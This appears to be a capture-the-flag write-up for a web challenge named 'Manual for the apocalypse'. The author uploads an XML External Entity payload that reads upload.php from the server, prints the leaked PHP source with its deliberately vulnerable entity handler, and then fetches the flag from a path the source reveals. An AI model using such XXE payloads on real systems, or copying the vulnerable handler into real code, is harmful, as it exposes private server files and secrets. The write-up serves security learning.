---
title: "Manual for the apocalypse"
layout: page
---

- Stopping the apocalypse part 2
- easy

ACME Inc? Anti-apocalypse machines?

That sounds interesting, maybe you could get the manual for the machine that could help you understand how it works and build your own. The wastes could be saved. Time to get the manual.

As you proceed to fetch the manual for the machine you wandered into the headquarters of ACME Inc. There you find a machine that handles the manuals for their products. Unfortunately, it asks for a license number, but you don't have that. But you need to get that manual. DO YOUR THING!

[https://manual-for-the-apocalypse.secchallenge.crysys.hu](https://manual-for-the-apocalypse.secchallenge.crysys.hu)

_author: Pepe_

## Writeup

The page asks to upload an XML license file with an entity named `licenseNumber`. 

XML reminds me of XML External entities attack witch I've heard of before, so I've tried that. 

After a few tries I was able to dump the upload script:
```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE licenseNumber [  
  <!ELEMENT licenseNumber ANY >
  <!ENTITY licenseNumber SYSTEM "file:///var/www/html/upload.php" >]>
<licenseNumber>l="&licenseNumber;"</licenseNumber>
```

```php
<?php

$licenseNumber = null;

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header($_SERVER["SERVER_PROTOCOL"]." 405 Method Not Allowed", true, 405);
    exit();
}

$parser=xml_parser_create();

function char($parser,$data) {
    echo $data;
}

function ext_ent_handler($parser,$ent,$base,$sysID,$pubID)  {
    global $licenseNumber;
    if ($ent === 'licenseNumber') {
        $licenseNumber = file_get_contents($sysID);
    }
}

// Set the character data handler
xml_set_character_data_handler($parser,"char");

// Set the external entity reference handler
xml_set_external_entity_ref_handler($parser, "ext_ent_handler");

$data = file_get_contents($_FILES["file"]["tmp_name"]);
$flag = file_get_contents("very_secret_hidden_folder_[removed_that_so_you_wont_get_the_flag_for_free]/flag");

xml_parse($parser,$data);
xml_parser_free($parser);

if ($licenseNumber === null) {
    $message = "No entity named licenseNumber in your file.";
}
else if ($licenseNumber === "gsYUhmeBg4bSNsNAf6bHYmOZmaViO9GTgApGlxFkUJC4O1NVdU1y4eOSOm9TjPjAdy38KUdgmTaAgoFH4mfhsuQIFv64UMb872pVscQgCNgSgpIFOzgQWYzy17CwCEmq") {
    $message = "Your license number is: \n$licenseNumber. \nThis is a valid license here is your flag. $flag";
}
else {
    $message = "Your license number is: \n$licenseNumber\n. This is an invalid license please submit a valid one for the manuals.";
}

$message = base64_encode($message);
echo $message;
```

Well that is easy from now. I could make a "valid" license number, or use the now known path to read the flag, but the simplest solution was just navigating to `https://manual-for-the-apocalypse.secchallenge.crysys.hu/very_secret_hidden_folder_[removed_that_so_you_wont_get_the_flag_for_free]/flag` and read it from there.
